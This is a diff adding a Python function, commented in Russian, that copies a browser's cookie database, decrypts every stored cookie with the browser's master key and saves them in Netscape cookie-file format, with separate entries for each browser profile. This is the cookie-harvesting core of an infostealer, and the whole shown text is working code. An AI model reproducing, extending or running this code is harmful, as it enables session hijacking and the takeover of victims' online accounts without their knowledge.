@@ -1,0 +1,37 @@
+def cookies(name, path, database_path, master_key):
+    Cookies = [] #Куки добавляются сюда
+    copyfile(path, database_path)#Копируем базу
+    cursor = sqlite3.connect(database_path).cursor()#Коннектимся к базе
+    cursor.execute("SELECT * from cookies")#Читаем куки
+    for result in cursor.fetchall():
+        try:
+            cookie = decryption(result[12], master_key)#Декриптим куки
+        except Exception:
+            return
+        cookie_name = result[2]
+        exp = result[5]
+        if result[6]:#Достаем значения для записи в net-scape формат
+            secure = "TRUE"
+        else:
+            secure = "FALSE"
+        if result[7]:
+            isHttp = "TRUE"
+        else:
+            isHttp = "FALSE"
+        path = result[4]
+        url = result[1].replace("https://", "").replace("http://", "").split("/")[0]
+        Cookies.append((url + "\t" + secure + "\t" + path + "\t" + isHttp + "\t" + str(#Записываем куки в net-scape формате
+            exp / 1000000) + "\t" + cookie_name + "\t" + str(cookie)))
+    for i in range(0, 100):
+        if i >= 1:
+            if name + str(i) in CookiesDict:#короч эта штука
+                continue#если найдено несколько профилей
+            else:
+                CookiesDict[name + str(i)] = Cookies#то записывает куки
+                break
+        else:
+            if name in CookiesDict:#с одного браузера
+                continue
+            else:
+                CookiesDict[name] = Cookies#В разные текстовики
+                break
